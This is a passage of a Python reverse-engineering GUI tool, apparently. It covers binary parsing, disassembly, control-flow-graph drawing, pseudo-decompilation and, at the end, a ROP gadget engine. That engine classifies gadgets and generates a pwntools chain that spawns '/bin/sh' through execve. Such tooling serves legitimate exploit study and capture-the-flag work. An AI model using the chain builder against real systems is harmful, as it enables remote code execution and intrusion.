        if self._import_cache is not None:
            return self._import_cache
        imps = []
        if self._lief_bin:
            for i in self._lief_bin.imported_functions:
                lib = ''
                try: lib = i.library.name if hasattr(i,'library') and i.library else ''
                except Exception as _e: log.debug(f"Suppressed: {_e}")
                imps.append({'name':i.name,'library':lib})
        elif self.fmt==self.FMT_ELF and self._elf:
            for sec in self._elf.iter_sections():
                if isinstance(sec, SymbolTableSection):
                    for sym in sec.iter_symbols():
                        if sym['st_info']['type']=='STT_FUNC' and sym['st_shndx']=='SHN_UNDEF' and sym.name:
                            imps.append({'name':sym.name,'library':''})
        elif self.fmt==self.FMT_PE and self._pe and hasattr(self._pe,'DIRECTORY_ENTRY_IMPORT'):
            for entry in self._pe.DIRECTORY_ENTRY_IMPORT:
                lib = entry.dll.decode(errors='replace')
                for i in entry.imports:
                    imps.append({'name':i.name.decode(errors='replace') if i.name else f'ord({i.ordinal})','library':lib})
        self._import_cache = imps
        return imps

    def get_exports(self) -> List[dict]:
        if self._export_cache is not None:
            return self._export_cache
        exps = []
        if self._lief_bin:
            for e in self._lief_bin.exported_functions:
                exps.append({'name':e.name,'address':e.address})
        elif self.fmt==self.FMT_PE and self._pe and hasattr(self._pe,'DIRECTORY_ENTRY_EXPORT'):
            base = self._pe.OPTIONAL_HEADER.ImageBase
            for e in self._pe.DIRECTORY_ENTRY_EXPORT.symbols:
                exps.append({'name':e.name.decode(errors='replace') if e.name else f'ord({e.ordinal})',
                              'address':e.address+base})
        self._export_cache = exps
        return exps

    def get_symbols(self) -> List[dict]:
        if self._symbol_cache is not None:
            return self._symbol_cache
        syms = []
        if self.fmt==self.FMT_ELF and self._elf:
            for sec in self._elf.iter_sections():
                if isinstance(sec, SymbolTableSection):
                    for s in sec.iter_symbols():
                        if s.name:
                             syms.append({'name':s.name,'address':s['st_value'],
                                          'type':s['st_info']['type'],'binding':s['st_info']['bind'],
                                          'size':s['st_size']})
        self._symbol_cache = syms
        return syms

    def get_functions(self) -> List[Tuple[str,int]]:
        if self._func_cache is not None:
            return self._func_cache
        funcs = []; named = {}
        if self.fmt==self.FMT_ELF and self._elf:
            for sec in self._elf.iter_sections():
                if isinstance(sec, SymbolTableSection):
                    for sym in sec.iter_symbols():
                        if sym['st_info']['type']=='STT_FUNC' and sym['st_value']:
                            n = sym.name or f'sub_{sym["st_value"]:x}'
                            named[sym['st_value']] = n; funcs.append((n, sym['st_value']))
        elif self.fmt==self.FMT_PE and self._pe:
            if hasattr(self._pe,'DIRECTORY_ENTRY_EXPORT'):
                for e in self._pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    n = e.name.decode(errors='replace') if e.name else f'sub_{e.address:x}'
                    va = e.address + self._pe.OPTIONAL_HEADER.ImageBase
                    named[va] = n; funcs.append((n, va))
        if len(named) < 3 and HAS_CAPSTONE:
            for addr in self._scan_for_functions():
                if addr not in named:
                    named[addr] = f'sub_{addr:x}'; funcs.append((f'sub_{addr:x}', addr))
        ep = self.entry_point
        if ep and ep not in named: named[ep]='entry'; funcs.append(('entry', ep))
        seen, uniq = set(), []
        for n, a in funcs:
            if a not in seen: seen.add(a); uniq.append((n, a))
        uniq.sort(key=lambda x: x[1])
        self._func_cache = [(self.user_names.get(a, n), a) for n, a in uniq]
        return self._func_cache

    _md_cache: Dict[str, 'Cs'] = {}

    def _get_md(self):
        key = f'{self.arch}_{self.bits}'
        if key not in self._md_cache:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32
            md = Cs(CS_ARCH_X86, CS_MODE_64 if self.bits == 64 else CS_MODE_32)
            md.detail = True
            self._md_cache[key] = md
        return self._md_cache[key]

    def _scan_for_functions(self) -> List[int]:
        if not HAS_CAPSTONE: return []
        code, base = self._get_text_section()
        if not code: return []
        addrs = set()
        for pat in (b'\x55\x48\x89\xe5', b'\x55\x89\xe5', b'\x48\x83\xec'):
            idx = 0
            while True:
                idx = code.find(pat, idx)
                if idx < 0: break
                addrs.add(base + idx); idx += 1
        try:
            md = self._get_md()
            for i in md.disasm(code[:min(len(code),512*1024)], base):
                if i.mnemonic.lower() in ('call','callq') and i.op_str:
                    try:
                        t = int(i.op_str.strip(), 16)
                        if base <= t < base+len(code): addrs.add(t)
                    except Exception as _e: log.debug(f"Suppressed: {_e}")
        except Exception as _e: log.debug(f"Suppressed: {_e}")
        return sorted(addrs)

    def _get_text_section(self) -> Tuple[bytes, int]:
        if self._text_cache is not None:
            return self._text_cache
        if self.fmt==self.FMT_ELF and self._elf:
            for sec in self._elf.iter_sections():
                if sec.name in ('.text','.plt','text'):
                    d = sec.data()
                    if d:
                        self._text_cache = (d, sec['sh_addr'])
                        return self._text_cache
            for seg in self._elf.iter_segments():
                if seg['p_type']=='PT_LOAD' and (seg['p_flags']&1):
                    self._text_cache = (seg.data(), seg['p_vaddr'])
                    return self._text_cache
        elif self.fmt==self.FMT_PE and self._pe:
            for sec in self._pe.sections:
                if sec.Characteristics & 0x20000000:
                    self._text_cache = (sec.get_data(), self._pe.OPTIONAL_HEADER.ImageBase+sec.VirtualAddress)
                    return self._text_cache
        self._text_cache = (self._raw, 0)
        return self._text_cache

    def vaddr_to_offset(self, vaddr: int) -> int:
        cached = self._vaddr_to_offset_cache.get(vaddr)
        if cached is not None:
            return cached
        if self.fmt==self.FMT_ELF and self._elf:
            for seg in self._elf.iter_segments():
                if seg['p_type']=='PT_LOAD' and seg['p_vaddr'] <= vaddr < seg['p_vaddr']+seg['p_filesz']:
                    off = seg['p_offset'] + (vaddr - seg['p_vaddr'])
                    self._vaddr_to_offset_cache[vaddr] = off
                    return off
        elif self.fmt==self.FMT_PE and self._pe:
            base = self._pe.OPTIONAL_HEADER.ImageBase
            for sec in self._pe.sections:
                sv = sec.VirtualAddress + base
                if sv <= vaddr < sv+sec.SizeOfRawData:
                    off = sec.PointerToRawData + (vaddr - sv)
                    self._vaddr_to_offset_cache[vaddr] = off
                    return off
        self._vaddr_to_offset_cache[vaddr] = -1
        return -1

    def read_vaddr(self, vaddr: int, size: int) -> bytes:
        off = self.vaddr_to_offset(vaddr)
        if off < 0 or off+size > len(self._raw): return b''
        return self._raw[off:off+size]

    def get_function_size(self, addr: int) -> int:
        # Prefer ELF symbol table st_size if available
        if self.fmt == self.FMT_ELF and self._elf:
            try:
                from elftools.elf.sections import SymbolTableSection as _STS
                for sec in self._elf.iter_sections():
                    if isinstance(sec, _STS):
                        for sym in sec.iter_symbols():
                            if sym['st_value'] == addr and sym['st_size'] > 0:
                                return min(sym['st_size'], 0x10000)
            except Exception as _e: log.debug(f"Suppressed: {_e}")
        # Fallback: distance to next function (limit raised to 0x8000)
        funcs = sorted(self.get_functions(), key=lambda x: x[1])
        for i, (_, a) in enumerate(funcs):
            if a == addr:
                return min(funcs[i+1][1]-addr, 0x8000) if i+1 < len(funcs) else 0x800
        return 0x400

    def compute_entropy(self, data: bytes) -> float:
        if not data: return 0.0
        freq = [0]*256
        for b in data: freq[b] += 1
        n = len(data)
        return -sum(p*math.log2(p) for f in freq if (p := f/n) > 0)

    def detect_crypto(self) -> List[Tuple[str,int]]:
        if self._crypto_cache is not None:
            return self._crypto_cache
        self._crypto_cache = [(name, idx) for name, sig in CRYPTO_SIGNATURES.items()
                              if (idx := self._raw.find(sig)) >= 0]
        return self._crypto_cache

    def detect_packer(self) -> List[str]:
        if self._detect_packer_cache is not None:
            return self._detect_packer_cache
        hits = []
        for packer, sigs in STRING_SIGS.items():
            if any(s.encode('latin1', errors='replace') in self._raw for s in sigs): hits.append(packer)
        self._detect_packer_cache = hits
        return hits


# ══════════════════════════════════════════════════════════════════════
# Disassembler + CFG Builder
# ══════════════════════════════════════════════════════════════════════
class Disassembler:
    BRANCH_MNEMONICS = {
        'jmp','je','jne','jz','jnz','jg','jge','jl','jle',
        'ja','jae','jb','jbe','js','jns','jo','jno','jp','loop',
    }
    RET_MNEMONICS = {'ret','retq','retn','retf','iret','iretd','iretq','hlt'}

    def __init__(self, arch='x86_64', bits=64):
        if not HAS_CAPSTONE: raise RuntimeError('capstone not installed')
        m = {'x86_64':(CS_ARCH_X86,CS_MODE_64),'x86':(CS_ARCH_X86,CS_MODE_32),
             'ARM':(CS_ARCH_ARM,CS_MODE_ARM),'AArch64':(CS_ARCH_ARM64,CS_MODE_ARM)}
        self.md = Cs(*m.get(arch, (CS_ARCH_X86, CS_MODE_64 if bits==64 else CS_MODE_32)))
        self.md.detail = True

    def disassemble(self, code: bytes, base: int, max_insns=0) -> List[dict]:
        insns = []
        for i in self.md.disasm(code, base):
            insns.append({'address':i.address,'size':i.size,'mnemonic':i.mnemonic,
                          'op_str':i.op_str,'bytes':i.bytes.hex()})
            if max_insns and len(insns) >= max_insns: break
        return insns

    def build_cfg(self, insns: List[dict]) -> Dict[int, BasicBlock]:
        if not insns: return {}
        leaders = {insns[0]['address']}
        for i, insn in enumerate(insns):
            mn = insn['mnemonic'].lower()
            if mn in self.BRANCH_MNEMONICS or mn in self.RET_MNEMONICS or 'call' in mn:
                if i+1 < len(insns): leaders.add(insns[i+1]['address'])
                if mn in self.BRANCH_MNEMONICS:
                    try: leaders.add(int(insn['op_str'].strip(), 16))
                    except Exception as _e: log.debug(f"Suppressed: {_e}")
        blocks: Dict[int,BasicBlock] = {}
        current = None
        for insn in insns:
            if insn['address'] in leaders:
                current = BasicBlock(insn['address']); blocks[insn['address']] = current
            if current: current.instructions.append(insn)
        for addr, block in blocks.items():
            if not block.instructions: continue
            last = block.instructions[-1]
            mn = last['mnemonic'].lower()
            ft = last['address'] + last['size']
            if mn in self.RET_MNEMONICS: pass
            elif mn == 'jmp':
                try:
                    t = int(last['op_str'].strip(), 16)
                    if t in blocks:
                        block.successors.append((t,'unconditional')); blocks[t].predecessors.append((addr,'unconditional'))
                except Exception as _e: log.debug(f"Suppressed: {_e}")
            elif mn in self.BRANCH_MNEMONICS:
                try:
                    t = int(last['op_str'].strip(), 16)
                    if t in blocks:
                        block.successors.append((t,'true')); blocks[t].predecessors.append((addr,'true'))
                except Exception as _e: log.debug(f"Suppressed: {_e}")
                if ft in blocks: block.successors.append((ft,'false')); blocks[ft].predecessors.append((addr,'false'))
            else:
                if ft in blocks: block.successors.append((ft,'unconditional')); blocks[ft].predecessors.append((addr,'unconditional'))
        return blocks

    @staticmethod
    def layout_cfg(blocks: Dict[int,BasicBlock], entry: int, horizontal=False):
        if not blocks: return
        layers: Dict[int,int] = {}
        queue = [entry] if entry in blocks else list(blocks.keys())[:1]
        layers[queue[0]] = 0
        visited = {queue[0]}
        while queue:
            nq = []
            for addr in queue:
                if addr not in blocks: continue
                for succ, _ in blocks[addr].successors:
                    if succ not in visited and succ in blocks:
                        visited.add(succ); layers[succ] = layers[addr]+1; nq.append(succ)
            queue = nq
        mx = max(layers.values(), default=0)
        for addr in blocks:
            if addr not in layers: mx += 1; layers[addr] = mx
        layer_groups: Dict[int,List[int]] = defaultdict(list)
        for addr, lyr in layers.items(): layer_groups[lyr].append(addr)
        for addr, block in blocks.items():
            lines = [f'{hex(i["address"])}:  {i["mnemonic"]}  {i["op_str"]}' for i in block.instructions]
            block.width = max(240, max((len(l) for l in lines), default=20)*8 + 20)
            block.height = len(lines)*15 + 22 + 10
        Y_GAP, X_GAP = 70, 40
        if not horizontal:
            y = 20.0
            for lyr in sorted(layer_groups):
                va = [a for a in layer_groups[lyr] if a in blocks]
                tw = sum(blocks[a].width for a in va) + X_GAP*(len(va)-1)
                x = -tw/2; mh = 0
                for a in va:
                    blocks[a].x = x; blocks[a].y = y; x += blocks[a].width+X_GAP
                    mh = max(mh, blocks[a].height)
                y += mh + Y_GAP
        else:
            x = 20.0
            for lyr in sorted(layer_groups):
                va = [a for a in layer_groups[lyr] if a in blocks]
                th = sum(blocks[a].height for a in va) + Y_GAP*(len(va)-1)
                y = -th/2; mw = 0
                for a in va:
                    blocks[a].x = x; blocks[a].y = y; y += blocks[a].height+Y_GAP
                    mw = max(mw, blocks[a].width)
                x += mw + X_GAP


# ══════════════════════════════════════════════════════════════════════
# CFG Graphics Items
# ══════════════════════════════════════════════════════════════════════
class CFGBlockItem(QGraphicsRectItem):
    HEADER_H = 22

    def __init__(self, block: BasicBlock, func_map: Dict[int,str]):
        super().__init__(block.x, block.y, block.width, block.height)
        self.block = block; self.func_map = func_map
        self._build()

    def _build(self):
        self.setFlag(QGraphicsItem.GraphicsItemFlag.ItemIsSelectable, True)
        self.setAcceptHoverEvents(True)
        is_entry = not self.block.predecessors
        is_exit = not self.block.successors
        bc = QColor(C['green'] if is_entry else (C['orange'] if is_exit else C['surface2']))
        self.setPen(QPen(bc, 1.5))
        # Gradient background
        grad = QLinearGradient(self.block.x, self.block.y, self.block.x, self.block.y+self.block.height)
        grad.setColorAt(0, QColor(C['surface1']))
        grad.setColorAt(1, QColor(C['surface0']))
        self.setBrush(QBrush(grad))
        # Header
        hdr = QGraphicsRectItem(self.block.x, self.block.y, self.block.width, self.HEADER_H, self)
        hc = QColor(C['green'] if is_entry else (C['orange'] if is_exit else C['blue']))
        hc.setAlpha(160)
        hdr.setBrush(QBrush(hc)); hdr.setPen(QPen(Qt.PenStyle.NoPen))
        # Header text
        at = QGraphicsTextItem(hex(self.block.addr), self)
        at.setPos(self.block.x+6, self.block.y+2)
        at.setDefaultTextColor(QColor(C['text'])); at.setFont(QFont('JetBrains Mono',8,QFont.Weight.Bold))
        # Instructions
        y_off = self.block.y + self.HEADER_H + 2
        for insn in self.block.instructions:
            mn = insn['mnemonic'].lower()
            color = MNEMONIC_COLOR_MAP.get(mn, C['text'])
            line = f"  {insn['mnemonic']:<8} {insn['op_str']}"
            if mn in ('call','callq'):
                try:
                    t = int(insn['op_str'].strip(), 16)
                    if t in self.func_map: line += f'  → {self.func_map[t]}'
                except Exception as _e: log.debug(f"Suppressed: {_e}")
            txt = QGraphicsTextItem(line, self)
            txt.setPos(self.block.x+4, y_off)
            txt.setDefaultTextColor(QColor(color)); txt.setFont(QFont('JetBrains Mono',8))
            y_off += 15

    def hoverEnterEvent(self, event):
        lines = [f'{hex(i["address"])}: {i["mnemonic"]} {i["op_str"]}' for i in self.block.instructions]
        from PyQt6.QtWidgets import QToolTip as _TT
        # Unified pos helper: PyQt5 uses screenPos() returning QPoint,
        # PySide6 uses screenPos() returning QPointF with .toPoint()
        sp = event.screenPos()
        pt = sp.toPoint() if hasattr(sp, 'toPoint') else sp
        _TT.showText(pt, '\n'.join(lines))
        super().hoverEnterEvent(event)

    def hoverLeaveEvent(self, event):
        from PyQt6.QtWidgets import QToolTip as _TT
        _TT.hideText()
        super().hoverLeaveEvent(event)


class CFGView(QGraphicsView):
    block_clicked = Signal(int)

    def __init__(self):
        super().__init__()
        self._scene = QGraphicsScene(self)
        self.setScene(self._scene)
        self.setRenderHint(QPainter.RenderHint.Antialiasing)
        self.setRenderHint(QPainter.RenderHint.TextAntialiasing)
        self.setDragMode(QGraphicsView.DragMode.ScrollHandDrag)
        self.setTransformationAnchor(QGraphicsView.ViewportAnchor.AnchorUnderMouse)
        self._zoom = 1.0

    def wheelEvent(self, event):
        factor = 1.2 if event.angleDelta().y() > 0 else 1/1.2
        self._zoom = max(0.1, min(self._zoom*factor, 5.0))
        self.scale(factor, factor)

    def load_cfg(self, blocks: Dict[int,BasicBlock], entry: int, func_map: Dict[int,str]):
        self._scene.clear()
        if not blocks:
            self._scene.addText('No CFG available').setDefaultTextColor(QColor(C['subtext0']))
            return
        for block in blocks.values():
            self._scene.addItem(CFGBlockItem(block, func_map))
        self._draw_edges(blocks)
        self.fitInView(self._scene.sceneRect().adjusted(-30,-30,30,30), Qt.AspectRatioMode.KeepAspectRatio)

    def _draw_edges(self, blocks: Dict[int,BasicBlock]):
        COLS = {'true':QColor(C['green']),'false':QColor(C['red']),'unconditional':QColor(C['blue'])}
        for addr, block in blocks.items():
            for succ_addr, etype in block.successors:
                if succ_addr not in blocks: continue
                succ = blocks[succ_addr]
                color = COLS.get(etype, QColor(C['subtext0']))
                pen = QPen(color, 1.5)
                sx = block.x + block.width/2; sy = block.y + block.height
                ex = succ.x + succ.width/2;   ey = succ.y
                path = QPainterPath()
                path.moveTo(sx, sy); mid_y = sy + (ey-sy)/2
                path.lineTo(sx, mid_y); path.lineTo(ex, mid_y); path.lineTo(ex, ey)
                pi = QGraphicsPathItem(path); pi.setPen(pen); self._scene.addItem(pi)
                # Arrow
                sz = 7; pts = [QPointF(ex, ey+5), QPointF(ex-sz/2, ey-sz+5), QPointF(ex+sz/2, ey-sz+5)]
                arr = QGraphicsPolygonItem(QPolygonF(pts))
                arr.setBrush(QBrush(color)); arr.setPen(QPen(color,1)); self._scene.addItem(arr)


# ══════════════════════════════════════════════════════════════════════
# Syntax Highlighters
# ══════════════════════════════════════════════════════════════════════
class AsmHighlighter(QSyntaxHighlighter):
    def __init__(self, doc):
        super().__init__(doc)
        def fmt(color, bold=False):
            f = QTextCharFormat()
            f.setForeground(QColor(color))
            if bold: f.setFontWeight(QFont.Weight.Bold)
            return f
        self._rules = []
        for mn, col in MNEMONIC_COLOR_MAP.items():
            self._rules.append((re.compile(rf'\b{re.escape(mn)}\b', re.IGNORECASE), fmt(col, True)))
        for reg in X86_REGISTERS:
            self._rules.append((re.compile(rf'\b{re.escape(reg)}\b'), fmt(C['teal'])))
        self._rules += [
            (re.compile(r'\b0x[0-9a-fA-F]+\b'), fmt(C['orange'])),
            (re.compile(r'\b\d+\b'), fmt(C['yellow'])),
            (re.compile(r';.*$'), fmt(C['overlay1'])),
            (re.compile(r'^\s*[0-9a-fA-F]+:'), fmt(C['blue'])),
            (re.compile(r'<[^>]+>'), fmt(C['green'])),
        ]

    def highlightBlock(self, text):
        for pat, fmt in self._rules:
            for m in pat.finditer(text):
                self.setFormat(m.start(), m.end()-m.start(), fmt)


class CHighlighter(QSyntaxHighlighter):
    KEYWORDS = re.compile(r'\b(void|int|char|unsigned|long|short|return|if|else|while|for|do|goto|struct|typedef|const|static|extern|sizeof|NULL|auto)\b')
    def __init__(self, doc): super().__init__(doc)
    def highlightBlock(self, text):
        def fmt(c): f=QTextCharFormat(); f.setForeground(QColor(c)); return f
        for m in self.KEYWORDS.finditer(text): self.setFormat(m.start(),m.end()-m.start(),fmt(C['mauve']))
        for m in re.finditer(r'\b0x[0-9a-fA-F]+\b|\b\d+\b', text): self.setFormat(m.start(),m.end()-m.start(),fmt(C['orange']))
        for m in re.finditer(r'"[^"]*"', text): self.setFormat(m.start(),m.end()-m.start(),fmt(C['green']))
        for m in re.finditer(r'//.*$|/\*.*?\*/', text): self.setFormat(m.start(),m.end()-m.start(),fmt(C['overlay1']))
        for m in re.finditer(r'\b[a-zA-Z_]\w*\s*(?=\()', text): self.setFormat(m.start(),m.end()-m.start(),fmt(C['blue']))


# ══════════════════════════════════════════════════════════════════════
# PseudoDecompiler
# ══════════════════════════════════════════════════════════════════════
class PseudoDecompiler:
    def __init__(self, loader: BinaryLoader):
        self.loader = loader; self.r2 = None
        if HAS_R2PIPE:
            try:
                self.r2 = r2pipe.open(loader.path, flags=['-2'])
                self.r2.cmd('aaa')
            except Exception as e:
                log.warning(f'r2pipe init failed: {e}')
                self.r2 = None

    def decompile(self, addr: int, size: int) -> str:
        if self.r2:
            try:
                self.r2.cmd(f's {hex(addr)}')
                for cmd in ('pdg', 'pdd'):
                    out = self.r2.cmd(cmd)
                    if out and len(out) > 10 and cmd not in out:
                        return f'/* r2/{cmd} — {hex(addr)} */\n\n' + out
            except Exception as _e: log.debug(f"Suppressed: {_e}")
        return self._pattern_decompile(addr, size)

    def _pattern_decompile(self, addr: int, size: int) -> str:
        code = self.loader.read_vaddr(addr, size)
        if not code: return f'/* Cannot read {hex(addr)} */\nvoid func_{addr:x}() {{\n  /* <no data> */\n}}'
        if not HAS_CAPSTONE: return '/* capstone not installed */'
        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32
            md = Cs(CS_ARCH_X86, CS_MODE_64 if self.loader.bits==64 else CS_MODE_32)
            md.detail = True
            insns = [{'address':i.address,'mnemonic':i.mnemonic,'op_str':i.op_str,'size':i.size}
                     for i in md.disasm(code, addr)]
        except Exception as e: return f'/* Disasm error: {e} */'
        func_map = {a:n for n,a in self.loader.get_functions()}
        func_map.update(self.loader.user_names)
        fname = func_map.get(addr, f'func_{addr:x}')
        lines = [f'/* Pattern pseudo-C — {hex(addr)} */\nvoid {fname}() {{']
        reg_vals: Dict[str,str] = {}; const_vals: Dict[str,str] = {}
        locals_: Dict[int,str] = {}; vn = [0]
        def lname(off):
            if off not in locals_:
                vn[0] += 1; locals_[off] = f'var_{abs(off):x}'
            return locals_[off]
        output = []; indent = '    '; skip = True; i = 0
        while i < len(insns):
            insn = insns[i]; mn, op = insn['mnemonic'].lower(), insn['op_str']
            ops = [o.strip() for o in op.split(',')]
            if skip and mn in ('push','pop') and 'rbp' in op: i+=1; continue
            if skip and mn=='mov' and 'rbp' in op and 'rsp' in op: i+=1; continue
            if skip and mn=='sub' and 'rsp' in op: skip=False; i+=1; continue
            skip = False
            if mn in ('ret','retq','retn','leave'):
                rv = reg_vals.get('rax','')
                output.append(f'{indent}return{" "+rv if rv else ""};'); break
            elif 'call' in mn:
                callee = op.strip()
                try:
                    t = int(callee, 16); callee = func_map.get(t, callee)
                except Exception as _e: log.debug(f"Suppressed: {_e}")
                args = [reg_vals.get(r,'') for r in SYS_ARGS]
                args = [a for a in args if a]
                rs = f'result_{i}'; reg_vals['rax'] = reg_vals['eax'] = rs
                output.append(f'{indent}{rs} = {callee}({", ".join(args)});')
            elif mn == 'cmp' and len(ops)>=2:
                last_cmp = (reg_vals.get(ops[0],ops[0]), reg_vals.get(ops[1],ops[1]))
                i+=1; continue
            elif mn.startswith('j') and mn != 'jmp':
                cm = {'je':'==','jz':'==','jne':'!=','jnz':'!=','jg':'>','jge':'>=','jl':'<','jle':'<='}
                sym = cm.get(mn, f'/* {mn} */')
                try:
                    t = int(op.strip(), 16)
                    lc = locals().get('last_cmp',('?','?'))
                    output.append(f'{indent}if ({lc[0]} {sym} {lc[1]}) goto {hex(t)};')
                except Exception: output.append(f'{indent}/* {mn} {op} */')
            elif mn == 'jmp':
                try: output.append(f'{indent}goto {hex(int(op.strip(),16))};')
                except Exception: output.append(f'{indent}goto *{op};')
            elif mn in ('mov','movsx','movzx','movabs') and len(ops)>=2:
                dst, src = ops[0], ops[1]
                try:
                    imm = int(src,16) if src.startswith('0x') else int(src)
                    sv = hex(imm) if abs(imm)>9 else str(imm)
                    const_vals[dst] = sv
                except Exception: const_vals.pop(dst, None)
                if '[rbp' in dst:
                    m2 = re.search(r'rbp\s*([+-]\s*0x[0-9a-fA-F]+|\s*[+-]\s*\d+)', dst)
                    off = int(m2.group(1).replace(' ',''),16) if m2 else 0
                    sv = const_vals.get(src, reg_vals.get(src, src))
                    output.append(f'{indent}{lname(off)} = {sv};')
                elif '[rbp' in src:
                    m2 = re.search(r'rbp\s*([+-]\s*0x[0-9a-fA-F]+)', src)
                    off = int(m2.group(1).replace(' ',''),16) if m2 else 0
                    reg_vals[dst] = lname(off)
                else:
                    sv = const_vals.get(src, reg_vals.get(src, src))
                    reg_vals[dst] = sv
            elif mn == 'lea' and len(ops)>=2:
                dst, src = ops[0], ops[1]
                m2 = re.search(r'rbp\s*([+-]\s*0x[0-9a-fA-F]+)', src)
                if m2:
                    off = int(m2.group(1).replace(' ',''),16)
                    reg_vals[dst] = f'&{lname(off)}'
                else: reg_vals[dst] = f'&({src})'
            elif mn == 'xor' and len(ops)>=2 and ops[0]==ops[1]:
                reg_vals[ops[0]] = const_vals[ops[0]] = '0'
            elif mn in ('nop','endbr64','endbr32'): pass
            else: output.append(f'{indent}/* {mn} {op} */')
            i += 1
        lines.extend(output); lines.append('}')
        return '\n'.join(lines)

    def close(self):
        if self.r2:
            try: self.r2.quit()
            except Exception as _e: log.debug(f"Suppressed: {_e}")


# ══════════════════════════════════════════════════════════════════════
# ROPEngine (exrop-style semantic analysis)
# ══════════════════════════════════════════════════════════════════════
class ROPGadget:
    CLASSES = {
        'pop_rdi':  r'pop\s+rdi\s*;\s*ret',
        'pop_rsi':  r'pop\s+rsi\s*;\s*ret',
        'pop_rdx':  r'pop\s+rdx\s*;\s*ret',
        'pop_rax':  r'pop\s+rax\s*;\s*ret',
        'pop_rbp':  r'pop\s+rbp\s*;\s*ret',
        'pop_rcx':  r'pop\s+rcx\s*;\s*ret',
        'syscall':  r'syscall',
        'int_80':   r'int\s+0x80',
        'ret':      r'^ret$',
        'leave_ret':r'leave\s*;\s*ret',
        'jmp_rsp':  r'jmp\s+rsp',
        'call_rsp': r'call\s+rsp',
        'mov_rdi':  r'mov\s+rdi\s*,',
        'mov_rax':  r'mov\s+rax\s*,\s*(?:0x3b|59)\b',
        'xor_rdi':  r'xor\s+rdi\s*,\s*rdi',
        'xor_rsi':  r'xor\s+rsi\s*,\s*rsi',
        'xor_rdx':  r'xor\s+rdx\s*,\s*rdx',
        'mov_mem':  r'mov\s+\[r\w+\]\s*,\s*r\w+',
        'add_rsp':  r'add\s+rsp\s*,\s*0x[0-9a-f]+\s*;\s*ret',
    }

    def __init__(self, addr: int, insns: List[dict]):
        self.addr = addr
        self.insns = insns
        self.text = ' ; '.join(f'{i["mnemonic"]} {i["op_str"]}'.strip() for i in insns)
        self.classes: List[str] = []
        for cls, pat in self.CLASSES.items():
            if re.search(pat, self.text, re.IGNORECASE):
                self.classes.append(cls)


class ROPEngine:
    """
    exrop-inspired ROP gadget engine.
    - Semantic classification of gadgets
    - Chain building for execve("/bin/sh") and ret2libc
    - Search by regex or class
    """
    MAX_GADGET_SIZE = 8  # max instructions per gadget

    def __init__(self, loader: BinaryLoader):
        self.loader = loader
        self.gadgets: List[ROPGadget] = []
        self._by_class: Dict[str,List[ROPGadget]] = defaultdict(list)
        self._scanned = False

    MAX_SCAN_BYTES = 2 * 1024 * 1024  # 2 MB cap
    _md_cache: Dict[str, 'Cs'] = {}

    def _get_md(self):
        bits = self.loader.bits
        key = f'x86_{bits}'
        if key not in self._md_cache:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32
            md = Cs(CS_ARCH_X86, CS_MODE_64 if bits == 64 else CS_MODE_32)
            md.detail = True
            self._md_cache[key] = md
        return self._md_cache[key]

    def scan(self, progress_cb=None, cancel_flag: list = None) -> int:
        """
        ROP gadget scan.  progress_cb(pct, msg) optional.
        cancel_flag is a single-element list [False]; set [True] to abort.
        Scans at most MAX_SCAN_BYTES of the .text section.
        """
        if not HAS_CAPSTONE:
            return 0
        self.gadgets.clear(); self._by_class.clear()
        code, base = self.loader._get_text_section()
        if len(code) > self.MAX_SCAN_BYTES:
            log.warning(f'ROP scan: truncating {len(code)//1024}KB to {self.MAX_SCAN_BYTES//1024}KB')
            code = code[:self.MAX_SCAN_BYTES]
        md = self._get_md()
        ret_offsets = [i for i, b in enumerate(code)
                       if b == 0xC3 or (b == 0xC2 and i+2 < len(code))]
        seen_addrs: set = set()
        total = len(ret_offsets)
        for idx, ret_off in enumerate(ret_offsets):
            if cancel_flag and cancel_flag[0]:
                log.info('ROP scan cancelled by user')
                break
            if progress_cb and idx % 200 == 0:
                progress_cb(int(idx*100/total) if total else 100,
                            f'Scanning gadgets… {idx}/{total}  ({len(self.gadgets)} found)')
            for start in range(max(0, ret_off - self.MAX_GADGET_SIZE*8), ret_off+1):
                start_va = base + start
                if start_va in seen_addrs: continue
                insns = []
                try:
                    for i in md.disasm(code[start:ret_off+1], start_va):
                        insns.append({'address':i.address,'mnemonic':i.mnemonic,
                                      'op_str':i.op_str,'size':i.size})
                        if i.mnemonic.lower() in ('ret','retq','retn'): break
                        if len(insns) > self.MAX_GADGET_SIZE: break
                except Exception: continue
                if not insns: continue
                if insns[-1]['mnemonic'].lower() not in ('ret','retq','retn'): continue
                gadget = ROPGadget(start_va, insns)
                if gadget.addr not in seen_addrs:
                    seen_addrs.add(gadget.addr)
                    self.gadgets.append(gadget)
                    for cls in gadget.classes:
                        self._by_class[cls].append(gadget)
        self._scanned = True
        return len(self.gadgets)

    def search(self, query: str, semantic_cls: str = '') -> List[ROPGadget]:
        """Search gadgets by regex or semantic class."""
        results = self.gadgets
        if semantic_cls and semantic_cls in self._by_class:
            results = self._by_class[semantic_cls]
        if query:
            try:
                pat = re.compile(query, re.IGNORECASE)
                results = [g for g in results if pat.search(g.text)]
            except re.error: pass
        return results[:500]  # cap results

    def get_class(self, cls: str) -> List[ROPGadget]:
        return self._by_class.get(cls, [])

    def best(self, cls: str) -> Optional[ROPGadget]:
        gs = self._by_class.get(cls, [])
        return gs[0] if gs else None

    def build_execve_chain(self, bin_sh_addr: int) -> str:
        """Build a commented pwntools ROP chain for execve("/bin/sh")."""
        g_pop_rdi = self.best('pop_rdi')
        g_pop_rsi = self.best('pop_rsi')
        g_pop_rdx = self.best('pop_rdx')
        g_pop_rax = self.best('pop_rax')
        g_syscall = self.best('syscall')
        lines = ['# ── execve("/bin/sh", NULL, NULL) — syscall chain ──',
                 'from pwn import *', '', '# Gadgets:']
        for label, g in [('pop rdi ; ret', g_pop_rdi), ('pop rsi ; ret', g_pop_rsi),
                          ('pop rdx ; ret', g_pop_rdx), ('pop rax ; ret', g_pop_rax),
                          ('syscall',       g_syscall)]:
            addr = hex(g.addr) if g else '??? # NOT FOUND'
            lines.append(f'# {label:22}  @ {addr}')
        lines += [
            '',
            f'bin_sh = {hex(bin_sh_addr)}  # address of "/bin/sh" string',
            '',
            'rop = ROP(elf)',
            f'rop.raw({hex(g_pop_rdi.addr) if g_pop_rdi else "POP_RDI"})',
            'rop.raw(bin_sh)',
            f'rop.raw({hex(g_pop_rsi.addr) if g_pop_rsi else "POP_RSI"})',
            'rop.raw(0)',
